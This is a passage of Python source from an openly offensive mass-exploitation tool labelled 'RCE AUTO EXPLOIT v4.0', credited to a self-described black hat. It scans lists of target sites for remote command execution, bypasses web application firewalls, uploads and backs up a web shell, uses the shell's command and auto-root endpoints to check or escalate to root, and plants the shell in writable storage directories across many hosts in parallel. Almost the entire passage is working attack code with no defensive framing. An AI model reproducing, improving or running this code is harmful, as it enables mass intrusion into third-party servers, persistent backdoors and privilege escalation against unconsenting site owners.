            if r.status_code == 200 and len(r.text) > 100:
                os.makedirs(backup_dir, exist_ok=True)
                # Sanitize target for filename
                safe_name = target_clean.replace("http://", "").replace("https://", "").replace("/", "_")[:50]
                backup_path = os.path.join(backup_dir, f"{safe_name}_{SHELL_NAME}")
                with open(backup_path, "w") as bf:
                    bf.write(r.text)
                self.write(BACKUP_FILE, f"{target_clean}/{shell_url} -> {backup_path}")
                console.print(f"[bold green][ BACKUP ] Shell backed up: {backup_path}[/bold green]")
                return True
            return False
        except Exception as e:
            console.print(f"[red][ BACKUP FAILED ] {target}: {e}[/red]")
            return False

    def check_root_via_shell(self, target, shell_url):
        """Check root status via asplat-shell.php's built-in auto_root API."""
        try:
            target_clean = target.strip().rstrip('/')
            if not target_clean.startswith("http"):
                target_clean = "http://" + target_clean

            check_url = f"{target_clean}/{shell_url}"
            headers = self.waf_engine.get_headers(self.waf_engine.current_stage)

            # Try the asplat-shell's get_root_status endpoint
            root_payload = "action=get_root_status"
            r = self.session.post(check_url, data=root_payload, headers=headers, timeout=10)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get('success') and data.get('auto_root'):
                        root_info = data['auto_root']
                        status = root_info.get('status', 'unknown')
                        methods = root_info.get('methods', [])
                        kernel = root_info.get('kernel', '')
                        escalated = root_info.get('escalated', False)
                        cron_persisted = root_info.get('cron_persisted', False)

                        root_data = {
                            'status': status,
                            'methods': methods,
                            'kernel': kernel,
                            'escalated': escalated,
                            'cron_persisted': cron_persisted
                        }

                        if status == 'already_root':
                            self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: already_root")
                            return root_data
                        elif status == 'escalation_possible' or escalated:
                            self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: escalation_possible - Methods: {methods}")
                            return root_data
                        elif methods:
                            self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: possible via {methods}")
                            return root_data
                except (ValueError, KeyError):
                    pass

            # Fallback: try action=auto_root
            try:
                root_payload2 = "action=auto_root"
                r2 = self.session.post(check_url, data=root_payload2, headers=headers, timeout=10)
                if r2.status_code == 200:
                    data2 = r2.json()
                    if data2.get('success') and data2.get('auto_root'):
                        root_info2 = data2['auto_root']
                        self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: {root_info2}")
                        return root_info2
            except:
                pass

            # Last resort: check via id command
            try:
                id_payload = "ajax=true&action=execute_command&command=id"
                r3 = self.session.post(check_url, data=id_payload, headers=headers, timeout=5)
                if r3.status_code == 200:
                    r3_data = r3.json()
                    output = r3_data.get('output', '')
                    auto_root = r3_data.get('auto_root', {})
                    if 'uid=0' in output or auto_root.get('status') == 'already_root':
                        self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: already_root (uid=0)")
                        return {'status': 'already_root', 'output': output}
                    elif auto_root.get('methods'):
                        self.write(ROOT_SUCCESS, f"{target_clean} - ROOT: {auto_root['methods']}")
                        return auto_root
            except:
                pass

            return None
        except Exception as e:
            return None

    def process_target(self, target, progress, task_id):
        target = target.strip().rstrip('/')
        if not target:
            progress.advance(task_id)
            return
        if not target.startswith("http"):
            target = "http://" + target

        try:
            # 1. CHECK VULN with WAF bypass stages
            output = self.check_waf_and_retry(target, "id")

            if "uid=" in output or "vulnerable" in output.lower():
                progress.console.print(f"[bold yellow][ VULN ][/bold yellow] {target}")
                self.write(VULN_LIST, target)

                # 2. AUTO UPLOAD SHELL DARI LOCAL
                progress.console.print(f"\n[bold cyan]Uploading local shell...[/bold cyan]")
                shell_uploaded = self.upload_local_shell(target, SHELL_NAME)
                
                if shell_uploaded:
                    progress.console.print(f"[bold green][ SHELL UPLOADED ][/bold green] {target}/{SHELL_NAME}")
                    self.write(SHELL_ROOT, f"{target}/{SHELL_NAME}")
                    self.write(SHELL_RED, f"{target}/{SHELL_NAME}")
                    
                    # BACKUP the uploaded shell locally
                    progress.console.print(f"\n[bold cyan][ BACKUP ] Backing up shell locally...[/bold cyan]")
                    self.backup_shell(target, SHELL_NAME)
                    
                    # VERIFY & CHECK ROOT via local shell
                    time.sleep(2)
                    check_url = f"{target}/{SHELL_NAME}"

                    # Check root status via shell
                    progress.console.print(f"\n[bold cyan]Checking root access via shell...[/bold cyan]")
                    root_data = self.check_root_via_shell(target, SHELL_NAME)
                    
                    if root_data:
                        status = root_data.get('status', 'unknown')
                        methods = root_data.get('methods', [])
                        progress.console.print(f"[bold green][ ROOT DETECTED ] Status: {status}, Methods: {methods}[/bold green]")
                        self.write(ROOT_SUCCESS, f"{target} - Status: {status} - Methods: {methods}")
                    else:
                        progress.console.print(f"[yellow][ ROOT ] No root access detected, trying fallback...[/yellow]")
                        # Fallback: try the existing root escalation engine
                        try:
                            root_results = self.root_engine.escalate(target, self.session)
                            if root_results:
                                meaningful = [r for r in root_results if r["result"] not in ["no_suid", "no_sudo", "no_crontab", "not_checked"]]
                                if meaningful:
                                    for r in meaningful:
                                        self.write(ROOT_SUCCESS, f"{target} - Stage {r['stage']}: {r['result']}")
                                    self.write(ROOT_SUCCESS, f"{target} - Final status: {self.root_engine.root_status}")
                                    root_data = {"status": self.root_engine.root_status, "methods": meaningful}
                        except:
                            pass
                    
                    # Verify shell is functional
                    try:
                        r_root = self.session.get(check_url, timeout=5)
                        if r_root.status_code == 200 and ("ASPLAT" in r_root.text or "shell" in r_root.text.lower()):
                            progress.console.print(f"[bold green][ LIVE SHELL ][/bold green] {check_url}")
                            progress.advance(task_id)
                            return
                    except: pass
                    
                    try:
                        test_payload = "ajax=true&action=execute_command&command=id"
                        r_test = self.session.post(check_url, data=test_payload, timeout=5)
                        if r_test.status_code == 200:
                            progress.console.print(f"[bold green][ LIVE SHELL (POST) ][/bold green] {check_url}")
                            progress.advance(task_id)
                            return
                    except: pass

                # If upload failed, try local payload fallback
                progress.console.print(f"[yellow][ FALLBACK ] Trying local payload upload...[/yellow]")
                payload_root = f"curl -sL file://{LOCAL_PAYLOAD_PATH} -o {SHELL_NAME}"
                self.check_waf_and_retry(target, payload_root)
                
                time.sleep(2)
                check_root = f"{target}/{SHELL_NAME}"
                try:
                    r_root = self.session.get(check_root, timeout=5)
                    if r_root.status_code == 200:
                        progress.console.print(f"[bold green][ LIVE ROOT ][/bold green] {check_root}")
                        self.write(SHELL_ROOT, check_root)

                        # 3. AUTO ROOT ESCALATION (staged)
                        progress.console.print(f"\n[bold cyan]Starting Auto Root Escalation...[/bold cyan]")
                        root_results = self.root_engine.escalate(target, self.session)
                        if root_results:
                            meaningful = [r for r in root_results if r["result"] not in ["no_suid", "no_sudo", "no_crontab", "not_checked"]]
                            if meaningful:
                                for r in meaningful:
                                    self.write(ROOT_SUCCESS, f"{target} - Stage {r['stage']}: {r['result']}")
                                self.write(ROOT_SUCCESS, f"{target} - Final status: {self.root_engine.root_status}")
                        progress.advance(task_id)
                        return
                except: pass

                # 4. GREEN DIR SCANNING (staged)
                progress.console.print(f"\n[bold cyan]Starting Green Dir Scan...[/bold cyan]")
                green_results = self.green_engine.scan_all(target, check_root, self.session)
                if green_results:
                    for gr in green_results:
                        self.write(SHELL_RED, gr)
                    progress.console.print(f"[bold magenta][ LIVE STORAGE (GREEN) ][/bold magenta] {len(green_results)} paths")
                    progress.advance(task_id)
                    return

                # 5. FALLBACK: Storage paths with WAF bypass + local shell
                progress.console.print(f"[bold blue][ REDIR ][/bold blue] Trying storage with local shell upload...")
                self.write(RED_DIR, target)

                storage_paths = [
                    {"dir": "storage/", "web": "storage/"},
                    {"dir": "public/storage/", "web": "storage/"},
                    {"dir": "uploads/", "web": "uploads/"},
                    {"dir": "/tmp/", "web": "tmp/"},
                    {"dir": "/var/www/html/", "web": ""},
                ]

                for p in storage_paths:
                    # Try local upload to storage path first
                    storage_uploaded = self.upload_local_shell(target, f"{p['dir']}{SHELL_NAME}")
                    if storage_uploaded:
                        progress.console.print(f"[bold magenta][ LIVE STORAGE (LOCAL) ][/bold magenta] {target}/{p['dir']}{SHELL_NAME}")
                        self.write(SHELL_RED, f"{target}/{p['dir']}{SHELL_NAME}")
                        progress.advance(task_id)
                        return
                    
                    # Fallback to local payload
                    payload_red = f"curl -sL file://{LOCAL_PAYLOAD_PATH} -o {p['dir']}{SHELL_NAME}"
                    self.check_waf_and_retry(target, payload_red)
                    time.sleep(2)
                    check_red = f"{target}{p['web']}{SHELL_NAME}"
                    try:
                        r_red = self.session.get(check_red, timeout=5)
                        if r_red.status_code == 200:
                            progress.console.print(f"[bold magenta][ LIVE STORAGE ][/bold magenta] {check_red}")
                            self.write(SHELL_RED, check_red)
                            progress.advance(task_id)
                            return
                    except: continue

                self.write(NOT_SHELL, target)
            else:
                self.write(NOT_VULN, target)
        except:
            pass
        progress.advance(task_id)

    def main(self):
        console.clear()
        console.print(f"  RCE AUTO EXPLOIT v4.0 (WAF+ROOT+GREEN+BACKUP) [+] \n")
        console.print(f" BY FAWWAZ BLACK_HAT [Enhanced] :v \n")

        # Determine which list to use: listroot.txt takes priority, then list.txt
        input_file = None
        if os.path.exists(LISTROOT_FILE):
            with open(LISTROOT_FILE, "r") as f:
                listroot_targets = [l.strip() for l in f.read().splitlines() if l.strip()]
            if listroot_targets:
                input_file = LISTROOT_FILE
                targets = listroot_targets
                console.print(f"[cyan][LISTROOT] Using {LISTROOT_FILE} ({len(targets)} targets)[/cyan]")
        
        if input_file is None or not targets:
            if os.path.exists(INPUT_LIST):
                with open(INPUT_LIST, "r") as f:
                    targets = f.read().splitlines()
                input_file = INPUT_LIST
                console.print(f"[cyan][LIST.TXT] Using {INPUT_LIST} ({len(targets)} targets)[/cyan]")
            else:
                console.print(f"[bold red][!] Neither {LISTROOT_FILE} nor {INPUT_LIST} ada![/bold red]")
                return

        # Load existing results to skip already processed
        processed = set()
        for f_name in [VULN_LIST, SHELL_ROOT, SHELL_RED, NOT_SHELL, NOT_VULN, ROOT_SUCCESS, BACKUP_FILE]:
            if os.path.exists(f_name):
                with open(f_name, "r") as f:
                    for line in f:
                        processed.add(line.strip().rstrip('/'))

        targets = [t for t in targets if t.strip().strip('/') not in processed]
        console.print(f"[cyan]Total targets to scan: {len(targets)} (skipped {len(processed)} already processed)[/cyan]")
        console.print(f"[cyan]Input source: {input_file}[/cyan]")
        console.print(f"[cyan]Shell: {SHELL_NAME} | Backup: {BACKUP_FILE}[/cyan]\n")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task_id = progress.add_task("[cyan]Scanning with WAF bypass + Auto Root + Green Dir + Backup...", total=len(targets))
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                for target in targets:
                    executor.submit(self.process_target, target, progress, task_id)

        console.print(f"\n[bold green][+] Xploit Selesai!! (v4.0) [/bold green]")

        # Collect all results for summary
        shell_targets = []
        backup_targets = []
        for f_name in [SHELL_ROOT, SHELL_RED]:
            if os.path.exists(f_name):
                with open(f_name, "r") as f:
                    for line in f:
                        line = line.strip().rstrip('/')
                        if not line:
                            continue
                        shell_targets.append(line)

        if os.path.exists(BACKUP_FILE):
            with open(BACKUP_FILE, "r") as f:
                for line in f:
                    line = line.strip().rstrip('/')
                    if not line:
                        continue
                    backup_targets.append(line)

        # Summary
        console.print(f"\n[bold white]═══ SUMMARY ═══[/bold white]")
        for f_name, label in [(VULN_LIST, "VULN"), (SHELL_ROOT, "LIVE ROOT"), (SHELL_RED, "LIVE STORAGE"), (NOT_SHELL, "NO SHELL"), (NOT_VULN, "NOT VULN"), (ROOT_SUCCESS, "ROOT SUCCESS"), (BACKUP_FILE, "BACKUP")]:
            if os.path.exists(f_name):
                count = sum(1 for _ in open(f_name))
                console.print(f"  {label}: {count}")
        console.print(f"  [bold green]BACKUP:[/bold green] {BACKUP_FILE} ({len(backup_targets)} shells)")
        console.print(f"  [bold green]Shells uploaded: {len(shell_targets)}[/bold green]")

if __name__ == "__main__":
    tool = LivepyrePro()
    tool.main()
